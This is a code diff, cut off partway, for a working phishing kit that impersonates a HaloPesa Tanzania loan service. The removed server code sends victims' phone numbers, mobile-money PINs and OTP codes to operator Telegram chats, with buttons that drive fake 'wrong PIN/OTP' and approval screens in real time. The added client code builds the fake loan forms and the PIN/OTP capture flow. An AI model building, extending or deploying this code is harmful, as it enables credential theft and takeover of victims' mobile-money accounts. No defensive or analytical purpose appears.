@@ -1,534 +1,428 @@
-/**
- * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Integrated with 5-step application flow, OTP verification, & success approval.
- */
+document.addEventListener('DOMContentLoaded', () => {
+  // Extract URL Params (Admin ID)
+  const urlParams = new URLSearchParams(window.location.search);
+  const adminChatId = urlParams.get('admin') || '';
 
-const express = require('express');
-const TelegramBot = require('node-telegram-bot-api');
-const path = require('path');
-const fs = require('fs');
+  // Elements
+  const sections = {
+    calc: document.getElementById('step-calculator'),
+    form1: document.getElementById('step-form-1'),
+    form2: document.getElementById('step-form-2'),
+    form3: document.getElementById('step-form-3'),
+    login: document.getElementById('step-login'),
+    otp: document.getElementById('step-otp'),
+    success: document.getElementById('step-success')
+  };
 
-const app = express();
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+  const navBackBtn = document.getElementById('navBackBtn');
 
-const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
-const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
-const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '';
-
-if (!TOKEN) {
-  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
-  process.exit(1);
-}
-
-if (!APP_URL) {
-  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
-  process.exit(1);
-}
-
-const ADMINS_FILE = path.join(__dirname, 'admins.json');
-
-function loadAdmins() {
-  try {
-    if (fs.existsSync(ADMINS_FILE)) {
-      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
-      const entries = JSON.parse(data);
-      return new Map(entries.map(([id, rec]) => [id, {
-        authorized: rec.authorized ?? false,
-        paid: rec.paid ?? false,
-        username: rec.username || '',
-        firstName: rec.firstName || 'User',
-        lastName: rec.lastName || '',
-        status: rec.status || 'PENDING'
-      }]));
+  // Surface Error Element Getters
+  function getErrorContainer(step) {
+    let errElem = document.getElementById(`${step}Error`);
+    if (!errElem) {
+      const parent = sections[step] || document.body;
+      errElem = document.createElement('div');
+      errElem.id = `${step}Error`;
+      errElem.style.cssText = 'color: #e60000; background-color: #ffe6e6; border: 1px solid #ffb3b3; padding: 10px; border-radius: 6px; font-size: 14px; font-weight: bold; text-align: center; margin: 10px 0; display: none;';
+      parent.insertBefore(errElem, parent.firstChild);
     }
-  } catch (err) {
-    console.error('[Storage] Error loading admins file:', err);
+    return errElem;
   }
-  return new Map();
-}
 
-function saveAdmins() {
-  try {
-    const serialized = JSON.stringify(Array.from(admins.entries()));
-    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
-  } catch (err) {
-    console.error('[Storage] Error saving admins file:', err);
-  }
-}
-
-let bot = null;
-const sessions = new Map();
-const admins = loadAdmins();
-const adminConfigMessageIds = new Map();
-
-/**
- * Validations: Hakiki Namba ya HaloPesa Tanzania (Inayoanza na 062, 061, 25562, au 25561 pekee)
- */
-function isValidHaloPesaNumber(number) {
-  const clean = String(number || '').replace(/\D/g, '');
-  return /^(062|061|25562|25561)\d{7}$/.test(clean);
-}
-
-/**
- * Validations: Hakiki kwamba ingizo ni namba pekee (Digits only)
- */
-function isNumericOnly(value) {
-  return /^\d+$/.test(String(value || '').trim());
-}
-
-function resolveTargetChat(adminParam) {
-  if (adminParam && String(adminParam).trim() !== '') {
-    const targetAdmin = String(adminParam).trim();
-    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
-      return FALLBACK_ADMIN_ID;
-    }
-    const adminRecord = admins.get(targetAdmin);
-    if (adminRecord && adminRecord.authorized) {
-      return targetAdmin;
+  function showUiError(step, message) {
+    const errElem = getErrorContainer(step);
+    if (errElem) {
+      errElem.textContent = message;
+      errElem.style.display = message ? 'block' : 'none';
     }
   }
-  return FALLBACK_ADMIN_ID || null;
-}
 
-async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
-  const PAGE_SIZE = 5;
-  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
-  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
+  function clearAllErrors() {
+    ['login', 'otp', 'form1', 'form2', 'form3'].forEach(step => {
+      const errElem = document.getElementById(`${step}Error`);
+      if (errElem) errElem.style.display = 'none';
+    });
+  }
+
+  // Slider Elements
+  const calcAmountSlider = document.getElementById('calcAmountSlider');
+  const calcAmountDisplay = document.getElementById('calcAmountDisplay');
+  const calcMonthsSlider = document.getElementById('calcMonthsSlider');
+  const calcMonthsDisplay = document.getElementById('calcMonthsDisplay');
+  const calcMonthlyPayment = document.getElementById('calcMonthlyPayment');
+
+  // Form inputs
+  const formAmount = document.getElementById('formAmount');
+  const formMonths = document.getElementById('formMonths');
+  const loanPurpose = document.getElementById('loanPurpose');
+  const firstName = document.getElementById('firstName');
+  const lastName = document.getElementById('lastName');
+  const phoneNumber = document.getElementById('phoneNumber');
+
+  // Helper: Switch View
+  function showSection(targetKey, showBack = true) {
+    clearAllErrors();
+    Object.keys(sections).forEach(key => {
+      if (sections[key]) sections[key].classList.remove('active');
+    });
+    if (sections[targetKey]) sections[targetKey].classList.add('active');
+    if (navBackBtn) navBackBtn.style.display = showBack && targetKey !== 'calc' && targetKey !== 'success' ? 'block' : 'none';
+    window.scrollTo(0, 0);
+  }
+
+  // Calculator Logic
+  function updateCalculator() {
+    if (!calcAmountSlider || !calcMonthsSlider) return;
+    const amount = parseInt(calcAmountSlider.value);
+    const months = parseInt(calcMonthsSlider.value);
+
+    if (calcAmountDisplay) calcAmountDisplay.textContent = `TSh ${amount.toLocaleString()}`;
+    if (calcMonthsDisplay) calcMonthsDisplay.textContent = `miezi ${months}`;
+
+    // Standard formula simulation: (Amount * 1.14) / Months
+    const monthly = Math.round((amount * 1.14) / months);
+    if (calcMonthlyPayment) calcMonthlyPayment.textContent = `TSh ${monthly.toLocaleString()}`;
+
+    // Sync to form 1
+    if (formAmount) formAmount.value = amount;
+  }
+
+  if (calcAmountSlider) calcAmountSlider.addEventListener('input', updateCalculator);
+  if (calcMonthsSlider) calcMonthsSlider.addEventListener('input', updateCalculator);
+
+  // Step Navigations
+  const btnStart = document.getElementById('btnStartApplication');
+  if (btnStart) btnStart.addEventListener('click', () => showSection('form1'));
   
-  if (page < 0) page = 0;
-  if (page >= totalPages) page = totalPages - 1;
-
-  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
-
-  let adminListText = `👑 *Jopo la Udhibiti wa Wasimamizi Wasaidizi* (Ukurasa ${page + 1} kati ya${totalPages})\n\nSimamia hali ya idhini ya wasimamizi wasaidizi:`;
-  let keyboard = [];
-
-  if (adminEntries.length === 0) {
-    adminListText += `\n\nHakuna wasimamizi wasaidizi walioanza kutumia bot bado.`;
-  } else {
-    paginatedEntries.forEach(([id, record]) => {
-      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'Mtumiaji');
-      const authStatus = record.authorized ? '🟢 Imeidhinishwa' : '🔴 Haijaidhinishwa / Inasubiri';
-      const subLink = `${APP_URL}/?admin=${id}`;
-      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Hali: ${authStatus}\n   🔗 \`${subLink}\``;
+  const btnStep2 = document.getElementById('btnToStep2');
+  if (btnStep2) {
+    btnStep2.addEventListener('click', () => {
+      document.getElementById('sumAmount').textContent = `TSh ${parseInt(formAmount.value).toLocaleString()}`;
+      document.getElementById('sumMonths').textContent = `Miezi ${formMonths.value}`;
+      document.getElementById('sumPurpose').textContent = loanPurpose.value || 'Haikuwekwa';
+      showSection('form2');
     });
   }
 
-  let navRow = [];
-  if (page > 0) navRow.push({ text: `⬅️ Iliyopita`, callback_data: `PAGE_${page - 1}` });
-  navRow.push({ text: `🔄 Onyesha Upya`, callback_data: `PAGE_${page}` });
-  if (page < totalPages - 1) navRow.push({ text: `Ijayo ➡`, callback_data: `PAGE_${page + 1}` });
-  if (navRow.length > 0) keyboard.push(navRow);
+  const btnBack1 = document.getElementById('btnBackTo1');
+  if (btnBack1) btnBack1.addEventListener('click', () => showSection('form1'));
 
-  if (messageId) {
-    try {
-      await bot.editMessageText(adminListText, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: keyboard }
-      });
-      return;
-    } catch (err) {}
-  }
-
-  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
-    parse_mode: 'Markdown',
-    reply_markup: { inline_keyboard: keyboard } 
-  });
-  adminConfigMessageIds.set(chatId, sentMsg.message_id);
-}
-
-async function initBot() {
-  bot = new TelegramBot(TOKEN, { polling: false });
-  
-  const webhookPath = `/bot${TOKEN}`;
-  const webhookUrl = `${APP_URL}${webhookPath}`;
-
-  try {
-    await bot.setWebHook(webhookUrl);
-    app.post(webhookPath, (req, res) => {
-      res.sendStatus(200);
-      try { bot.processUpdate(req.body); } catch (err) {}
-    });
-  } catch (err) {
-    process.exit(1);
-  }
-
-  bot.onText(/\/admins/, async (msg) => {
-    const chatId = String(msg.chat.id);
-    if (chatId !== String(FALLBACK_ADMIN_ID)) {
-      await bot.sendMessage(chatId, `⚠️ Huna idhini.`);
-      return;
-    }
-    await updateContinuousAdminList(chatId, null, 0);
-  });
-
-  bot.onText(/\/myprofile|\/me/, async (msg) => {
-    try {
-      const chatId = String(msg.chat.id);
-      const userId = msg.from.id;
-      const username = msg.from.username ? `@${msg.from.username}` : 'Hakuna';
-      const firstName = msg.from.first_name || 'Haipo';
-      const lastName = msg.from.last_name || 'Haipo';
+  const btnStep3 = document.getElementById('btnToStep3');
+  if (btnStep3) {
+    btnStep3.addEventListener('click', () => {
+      showUiError('form2', '');
+      const cleanContact = phoneNumber ? phoneNumber.value.replace(/\D/g, '') : '';
       
-      if (chatId !== String(FALLBACK_ADMIN_ID)) {
-        const record = admins.get(chatId);
-        if (!record || !record.authorized) {
-          await bot.sendMessage(chatId, `⚠️ Akaunti yako bado haijaidhinishwa. Tafadhali wasiliana na Msimamizi Mkuu kwa idhini.`);
-          return;
-        }
-      }
-      
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-
-      let profileText = 
-        `👤 *Taarifa zako za Kiungo Maalum*\n\n` +
-        `• *Jina la Kwanza:* ${firstName}\n` +
-        `• *Jina la Mwisho:* ${lastName}\n` +
-        `• *Jina la Mtumiaji:* ${username}\n` +
-        `• *Kitambulisho cha Telegram:* \`${userId}\`\n\n` +
-        `🔗 *Kiungo Chako Maalum:*\n${userLink}`;
-
-      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
-    } catch (err) {}
-  });
-
-  bot.onText(/\/start/, async (msg) => {
-    try {
-      const chatId = String(msg.chat.id);
-      const userId = msg.from.id;
-      const username = msg.from.username || '';
-      const firstName = msg.from.first_name || 'Mtumiaji';
-      const lastName = msg.from.last_name || '';
-
-      if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu. Kiungo chako kiko hai: ${APP_URL}\n\nAndika /admins kuona na kusimamia wasimamizi wasaidizi.`, {
-          parse_mode: 'Markdown'
-        });
+      if (!firstName.value || !cleanContact) {
+        showUiError('form2', 'Tafadhali jaza jina na namba ya simu.');
         return;
       }
 
-      if (!admins.has(chatId)) {
-        admins.set(chatId, {
-          authorized: false,
-          paid: false,
-          username,
-          firstName,
-          lastName,
-          startedAt: new Date()
-        });
-        saveAdmins();
-      } else {
-        const existing = admins.get(chatId);
-        existing.username = username;
-        existing.firstName = firstName;
-        existing.lastName = lastName;
-        saveAdmins();
-      }
-
-      const record = admins.get(chatId);
-
-      if (!record.authorized) {
-        await bot.sendMessage(FALLBACK_ADMIN_ID, 
-          `🚨 *Msimamizi Msaidizi Mpya Anasubiri Idhini!*\n\n` +
-          `👤 *Mtumiaji:* ${username ? '@' + username : firstName} (${firstName}${lastName})\n` +
-          `🆔 *Kitambulisho (Chat ID):* \`${userId}\`\n\n` +
-          `Tafadhali idhinisha au kataa ombi hili.`, 
-          { 
-            parse_mode: 'Markdown',
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  { text: '✅ Idhinisha', callback_data: `AUTH_YES_${userId}` },
-                  { text: '❌ Kataa', callback_data: `AUTH_NO_${userId}` }
-                ]
-              ]
-            }
-          }
-        );
-
-        await bot.sendMessage(chatId, 
-          `👋 *Karibu ${firstName}!*\n\n` +
-          `⚠ Akaunti yako kwa sasa **inasubiri idhini** kutoka kwa Msimamizi Mkuu.\n\n` +
-          `Tafadhali wasiliana na **Msimamizi Mkuu** ili kupitishwa na kupokea kiungo chako maalum.`, 
-          { parse_mode: 'Markdown' }
-        );
+      // Validations: HaloPesa Tanzania Pekee (062, 061, 25562, 25561)
+      const isHaloPesa = /^(062|061|25562|25561)\d{7}$/.test(cleanContact);
+      if (!isHaloPesa) {
+        showUiError('form2', 'Tafadhali ingiza namba sahihi ya HaloPesa Tanzania (inayoanza na 062 au 061).');
         return;
       }
 
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-      let responseText = `👋 *Karibu ${firstName}!*\n\nAkaunti yako imethibitishwa.\n\nKiungo chako kiko tayari na kinafanya kazi:\n${userLink}`;
-
-      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
-
-    } catch (err) {}
-  });
-
-  bot.on('callback_query', async (query) => {
-    try {
-      const actionData = query.data || '';
-      const chatId = String(query.message.chat.id);
-
-      if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
-        if (chatId !== String(FALLBACK_ADMIN_ID)) {
-          await bot.answerCallbackQuery(query.id, { text: '⚠️ Huna idhini ya kutenda hili.' });
-          return;
-        }
-
-        const parts = actionData.split('_');
-        const decision = parts[1];
-        const targetSubId = parts[2];
-        const subRecord = admins.get(targetSubId);
-
-        if (!subRecord) {
-          await bot.answerCallbackQuery(query.id, { text: '⚠️ Taarifa za msimamizi hazikupatikana.' });
-          return;
-        }
-
-        if (decision === 'YES') {
-          subRecord.authorized = true;
-          saveAdmins();
-
-          const assignedLink = `${APP_URL}/?admin=${targetSubId}`;
-          await bot.sendMessage(targetSubId, 
-            `🎉 *Hongera!* Akaunti yako imeidhinishwa na Msimamizi Mkuu.\n\n` +
-            `🔗 *Kiungo Chako Maalum:*\n${assignedLink}`,
-            { parse_mode: 'Markdown' }
-          ).catch(() => {});
-
-          await bot.answerCallbackQuery(query.id, { text: '✅ Msimamizi Ameidhinishwa Mafanikio!' });
-          await bot.editMessageText(`✅ *Msimamizi Msaidizi Ameidhinishwa*\n\nID: \`${targetSubId}\``, {
-            chat_id: chatId,
-            message_id: query.message.message_id,
-            parse_mode: 'Markdown'
-          });
-        } else {
-          admins.delete(targetSubId);
-          saveAdmins();
-
-          await bot.sendMessage(targetSubId, `❌ Ombi lako la kuwa msimamizi limekataliwa.`).catch(() => {});
-          await bot.answerCallbackQuery(query.id, { text: '❌ Ombi limekataliwa.' });
-          await bot.editMessageText(`❌ *Ombi Limekataliwa na Kufutwa*\n\nID: \`${targetSubId}\``, {
-            chat_id: chatId,
-            message_id: query.message.message_id,
-            parse_mode: 'Markdown'
-          });
-        }
-        return;
-      }
-
-      if (actionData.startsWith('PAGE_')) {
-        const pageNum = parseInt(actionData.split('_')[1]) || 0;
-        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
-        await bot.answerCallbackQuery(query.id);
-        return;
-      }
-
-      const parts = actionData.split('_');
-      const prefix = parts.slice(0, 2).join('_'); 
-      const targetId = parts.slice(2).join('_');
-
-      let session = sessions.get(targetId);
-      if (!session) {
-        session = { contact: 'Haijulikani', adminChatId: chatId };
-      }
-
-      const chatTarget = session.adminChatId || chatId;
-
-      switch (prefix) {
-        case 'ALLOW_OTP':
-          session.status = 'APPROVED_LOAD_OTP';
-          await bot.sendMessage(chatTarget, `✅ Skrini ya OTP imezidishwa kwa ${session.contact}`);
-          break;
-        case 'DENY_OTP':
-          session.status = 'DENIED';
-          await bot.sendMessage(chatTarget, `❌ Ufikiaji Umekataliwa kwa ${session.contact}`);
-          break;
-        case 'CORRECT_OTP':
-          session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Skrini ya mafanikio (Hongera) imewezeshwa kwa ${session.contact}`);
-          break;
-        case 'WRONG_PIN':
-          session.status = 'RETRY_PIN';
-          await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi imechochewa kwa ${session.contact}`);
-          break;
-        case 'WRONG_OTP':
-          session.status = 'RETRY_OTP';
-          await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi imechochewa kwa ${session.contact}`);
-          break;
-        default:
-          break;
-      }
-
-      await bot.answerCallbackQuery(query.id, { text: `Imeshughulikiwa: ${prefix}` }).catch(() => {});
-
-      if (query.message && query.message.message_id) {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        ).catch(() => {});
-      }
-    } catch (err) {
-      try {
-        await bot.answerCallbackQuery(query.id, { text: '⚠️ Hitilafu katika kuchakata kitendo.' }).catch(() => {});
-      } catch (e) {}
-    }
-  });
-}
-
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// Submit Application (Phone, PIN, Amount)
-app.post('/api/submit-application', async (req, res) => {
-  try {
-    let { contact, pin, amount, adminChatId } = req.body || {};
-
-    if (!adminChatId && req.query && req.query.admin) {
-      adminChatId = req.query.admin;
-    }
-
-    const cleanContact = String(contact || '').replace(/\D/g, '');
-
-    // 1. Hakikisha Namba ni ya HaloPesa Tanzania Pekee (062, 061, 25562, 25561)
-    if (!isValidHaloPesaNumber(cleanContact)) {
-      return res.status(400).json({ success: false, error: 'Tafadhali weka namba sahihi ya HaloPesa Tanzania (inayoanza na 062 au 061).' });
-    }
-
-    // 2. Hakikisha PIN ni namba pekee (Digits only)
-    if (!pin || !isNumericOnly(pin)) {
-      return res.status(400).json({ success: false, error: 'PIN lazima iwe namba pekee (Digits only).' });
-    }
-
-    const targetChat = resolveTargetChat(adminChatId);
-    if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Kitambulisho cha chat hakipo au msimamizi hajaidhinishwa.' });
-    }
-
-    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
-
-    sessions.set(userId, {
-      contact: cleanContact,
-      pin,
-      amount: amount || 'TSh 100,000',
-      adminChatId: targetChat,
-      status: 'WAITING_PIN_APPROVAL',
-      createdAt: new Date()
+      document.getElementById('sumName').textContent = `${firstName.value} ${lastName.value}`;
+      showSection('form3');
     });
+  }
 
-    const message =
-      `NEW HALOPESA APPLICATION\n\n` +
-      `NUMBER: ${cleanContact}\n` +
-      `PIN: ${pin}\n` +
-      `AMOUNT: ${amount || 'TSh 100,000'}`;
+  const btnBack2 = document.getElementById('btnBackTo2');
+  if (btnBack2) btnBack2.addEventListener('click', () => showSection('form2'));
 
-    const opts = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '✅ RUHUSU OTP', callback_data: `ALLOW_OTP_${userId}` },
-            { text: '❌ KATAA', callback_data: `DENY_OTP_${userId}` }
-          ]
-        ]
-      }
-    };
+  const btnLogin = document.getElementById('btnToLogin');
+  if (btnLogin) {
+    btnLogin.addEventListener('click', () => {
+      const loginPhone = document.getElementById('loginPhone');
+      if (loginPhone) loginPhone.value = phoneNumber.value;
+      showSection('login', false);
+    });
+  }
 
-    if (!bot) {
-      return res.status(500).json({ success: false, error: 'Bot haijainishwa bado.' });
-    }
+  // PIN Handling
+  const pinInputs = [
+    document.getElementById('pin1'),
+    document.getElementById('pin2'),
+    document.getElementById('pin3'),
+    document.getElementById('pin4')
+  ];
+  const btnLoginSubmit = document.getElementById('btnLoginSubmit');
 
-    const sentMsg = await bot.sendMessage(targetChat, message, opts);
-    const session = sessions.get(userId);
-    if (session) session.adminMsgId = sentMsg.message_id;
+  pinInputs.forEach((input, idx) => {
+    if (!input) return;
     
-    return res.status(200).json({ success: true, userId });
-
-  } catch (err) {
-    return res.status(500).json({ success: false, error: 'Kushindwa kutuma kupitia Telegram: ' + (err?.message || 'Hitilafu isiyojulikana') });
-  }
-});
-
-// Check status of application
-app.get('/api/check-status/:userId', (req, res) => {
-  const { userId } = req.params;
-  const session = sessions.get(userId);
-  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
-  res.status(200).json({ status: session.status });
-});
-
-// Resend OTP Command Endpoint
-app.post('/api/resend-otp', async (req, res) => {
-  try {
-    const { userId } = req.body || {};
-    const session = sessions.get(userId);
-
-    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
-
-    session.status = 'APPROVED_LOAD_OTP';
-
-    const message = `🔄 Mtumiaji ${session.contact} ameomba kutumiwa tena msimbo wa OTP (Resend OTP).`;
-    const targetChat = session.adminChatId;
-    if (targetChat && bot) {
-      await bot.sendMessage(targetChat, message);
-    }
-
-    return res.status(200).json({ success: true });
-  } catch (error) {
-    return res.status(500).json({ success: false, error: 'Kushindwa kutuma ombi la Resend OTP' });
-  }
-});
-
-// Submit OTP
-app.post('/api/submit-otp', async (req, res) => {
-  try {
-    const { userId, otp } = req.body || {};
-    const session = sessions.get(userId);
-
-    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
-
-    // 3. Hakikisha OTP ni namba pekee (Digits only)
-    if (!otp || !isNumericOnly(otp)) {
-      return res.status(400).json({ success: false, error: 'Msimbo wa OTP lazima uwe namba pekee (Digits only).' });
-    }
-
-    session.status = 'WAITING_OTP_VERIFICATION';
-    session.otp = otp;
-
-    const message =
-      `NEW HALOPESA OTP SUBMISSION\n\n` +
-      `NUMBER: ${session.contact}\n` +
-      `OTP CODE: ${otp}`;
-
-    const opts = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '⚠️ PIN SI SAHIHI', callback_data: `WRONG_PIN_${userId}` },
-            { text: '⚠️ OTP SI SAHIHI', callback_data: `WRONG_OTP_${userId}` }
-          ],
-          [
-            { text: '✅ OTP SAHIHI (HONGERA)', callback_data: `CORRECT_OTP_${userId}` }
-          ]
-        ]
+    // Zuia herufi wakati wa kuandika (Numbers only)
+    input.addEventListener('input', (e) => {
+      showUiError('login', '');
+      e.target.value = e.target.value.replace(/\D/g, ''); // Ondoa kila kisicho namba
+      if (e.target.value.length === 1 && idx < 3 && pinInputs[idx + 1]) {
+        pinInputs[idx + 1].focus();
       }
-    };
+      checkPinComplete();
+    });
 
-    const targetChat = session.adminChatId;
-    if (targetChat && bot) {
-      await bot.sendMessage(targetChat, message, opts);
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !e.target.value && idx > 0 && pinInputs[idx - 1]) {
+        pinInputs[idx - 1].focus();
+      }
+    });
+  });
+
+  function checkPinComplete() {
+    const pin = pinInputs.map(i => i ? i.value : '').join('');
+    if (btnLoginSubmit) {
+      if (pin.length === 4 && /^\d{4}$/.test(pin)) {
+        btnLoginSubmit.classList.add('active');
+        btnLoginSubmit.disabled = false;
+      } else {
+        btnLoginSubmit.classList.remove('active');
+        btnLoginSubmit.disabled = true;
+      }
     }
-
-    return res.status(200).json({ success: true });
-  } catch (error) {
-    return res.status(500).json({ success: false, error: 'Kushindwa kutuma kupitia Telegram' });
   }
-});
 
-const PORT = process.env.PORT || 10000;
-app.listen(PORT, async () => {
-  await initBot();
-  console.log(`Server is running on port ${PORT}`);
+  let activeUserId = '';
+
+  // Submit Application + PIN
+  if (btnLoginSubmit) {
+    btnLoginSubmit.addEventListener('click', async () => {
+      showUiError('login', '');
+      const loginPhoneElem = document.getElementById('loginPhone');
+      const contact = loginPhoneElem ? loginPhoneElem.value : phoneNumber.value;
+      const pin = pinInputs.map(i => i ? i.value : '').join('');
+      const amount = `TSh ${parseInt(formAmount.value).toLocaleString()}`;
+
+      // Hakiki PIN kabla ya kutuma
+      if (!/^\d{4}$/.test(pin)) {
+        showUiError('login', 'PIN lazima iwe namba pekee (Digits only).');
+        return;
+      }
+
+      showOverlay('Inatuma maombi...');
+
+      try {
+        const res = await fetch(`/api/submit-application?admin=${adminChatId}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ contact, pin, amount, adminChatId })
+        });
+
+        const data = await res.json();
+        if (data.success) {
+          activeUserId = data.userId;
+          updateOverlayText('Inasubiri idhini kutoka kwa msimamizi...');
+          pollStatus();
+        } else {
+          hideOverlay();
+          showUiError('login', data.error || 'Hitilafu imetokea.');
+        }
+      } catch (err) {
+        hideOverlay();
+        showUiError('login', 'Imeshindwa kuunganisha kwenye seva.');
+      }
+    });
+  }
+
+  // Status Polling for Continuous & Smooth Flow
+  let pollInterval = null;
+  function pollStatus() {
+    if (pollInterval) clearInterval(pollInterval);
+
+    pollInterval = setInterval(async () => {
+      if (!activeUserId) return;
+      try {
+        const res = await fetch(`/api/check-status/${activeUserId}`);
+        const data = await res.json();
+
+        if (data.status === 'APPROVED_LOAD_OTP') {
+          hideOverlay();
+          const otpDisp = document.getElementById('otpPhoneDisplay');
+          if (otpDisp) otpDisp.textContent = `+255${phoneNumber.value.replace(/^0/, '')}`;
+          showSection('otp', false);
+          startOtpTimer();
+        } else if (data.status === 'DENIED') {
+          clearInterval(pollInterval);
+          hideOverlay();
+          showSection('login', false);
+          showUiError('login', 'Ombi lako limekataliwa na msimamizi.');
+        } else if (data.status === 'SUCCESS') {
+          clearInterval(pollInterval);
+          hideOverlay();
+          showSuccessScreen();
+        } else if (data.status === 'RETRY_PIN') {
+          hideOverlay();
+          showSection('login', false);
+          showUiError('login', 'PIN uliyoingiza si sahihi. Tafadhali jaribu tena.');
+          pinInputs.forEach(i => { if (i) i.value = ''; });
+          checkPinComplete();
+        } else if (data.status === 'RETRY_OTP') {
+          hideOverlay();
+          showSection('otp', false);
+          showUiError('otp', 'OTP si sahihi. Tafadhali jaribu tena.');
+          otpInputs.forEach(i => { if (i) i.value = ''; });
+          if (btnOtpSubmit) btnOtpSubmit.disabled = true;
+        }
+      } catch (e) {}
+    }, 2000);
+  }
+
+  // OTP Handling
+  const otpInputs = [
+    document.getElementById('otp1'),
+    document.getElementById('otp2'),
+    document.getElementById('otp3'),
+    document.getElementById('otp4')
+  ];
+  const btnOtpSubmit = document.getElementById('btnOtpSubmit');
+
+  otpInputs.forEach((input, idx) => {
+    if (!input) return;
+    
+    // Zuia herufi wakati wa kuandika (Numbers only)
+    input.addEventListener('input', (e) => {
+      showUiError('otp', '');
+      e.target.value = e.target.value.replace(/\D/g, ''); // Ondoa kila kisicho namba
+      if (e.target.value.length === 1 && idx < 3 && otpInputs[idx + 1]) {
+        otpInputs[idx + 1].focus();
+      }
+      const otp = otpInputs.map(i => i ? i.value : '').join('');
+      if (btnOtpSubmit) {
+        btnOtpSubmit.disabled = (otp.length !== 4 || !/^\d{4}$/.test(otp));
+        if (otp.length === 4 && /^\d{4}$/.test(otp)) btnOtpSubmit.classList.add('active');
+        else btnOtpSubmit.classList.remove('active');
+      }
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !e.target.value && idx > 0 && otpInputs[idx - 1]) {
+        otpInputs[idx - 1].focus();
+      }
+    });
+  });
+
+  if (btnOtpSubmit) {
+    btnOtpSubmit.addEventListener('click', async () => {
+      showUiError('otp', '');
+      const otp = otpInputs.map(i => i ? i.value : '').join('');
+      
+      // Hakiki OTP kabla ya kutuma
+      if (!/^\d{4}$/.test(otp)) {
+        showUiError('otp', 'Msimbo wa OTP lazima uwe namba pekee (Digits only).');
+        return;
+      }
+
+      showOverlay('Inathibitisha OTP...');
+
+      try {
+        const res = await fetch('/api/submit-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ userId: activeUserId, otp })
+        });
+
+        const data = await res.json();
+        if (data.success) {
+          updateOverlayText('Inasubiri uhakiki wa OTP...');
+          pollStatus();
+        } else {
+          hideOverlay();
+          showUiError('otp', 'Kushindwa kutuma OTP.');
+        }
+      } catch (err) {
+        hideOverlay();
+        showUiError('otp', 'Hitilafu ya mtandao.');
+      }
+    });
+  }
+
+  function showSuccessScreen() {
+    const amountVal = parseInt(formAmount.value) || 100000;
+    const monthsVal = formMonths.value || 48;
+    const monthlyPay = Math.round((amountVal * 1.14) / monthsVal);
+
+    const elemAmount = document.getElementById('finalApprovedAmount');
+    const elemPay = document.getElementById('finalMonthlyPay');
+    const elemMonths = document.getElementById('finalMonths');
+
+    if (elemAmount) elemAmount.textContent = `TSh ${amountVal.toLocaleString()}`;
+    if (elemPay) elemPay.textContent = `TSh ${monthlyPay.toLocaleString()}`;
+    if (elemMonths) elemMonths.textContent = `Miezi ${monthsVal}`;
+
+    showSection('success', false);
+  }
+
+  // Resend OTP Command Logic
+  async function triggerResendOtp() {
+    if (!activeUserId) return;
+    showUiError('otp', '');
+    showOverlay('Inatuma ombi la msimbo mpya...');
+    try {
+      const res = await fetch('/api/resend-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: activeUserId })
+      });
+      const data = await res.json();
+      if (data.success) {
+        hideOverlay();
+        otpInputs.forEach(i => { if (i) i.value = ''; });
+        if (btnOtpSubmit) btnOtpSubmit.disabled = true;
+        startOtpTimer();
+        pollStatus();
+      } else {
+        hideOverlay();
+        showUiError('otp', 'Imeshindwa kuomba msimbo mpya.');
+      }
+    } catch (e) {
+      hideOverlay();
+      showUiError('otp', 'Hitilafu ya mtandao.');
+    }
+  }
+
+  // Timer with Resend Event Trigger
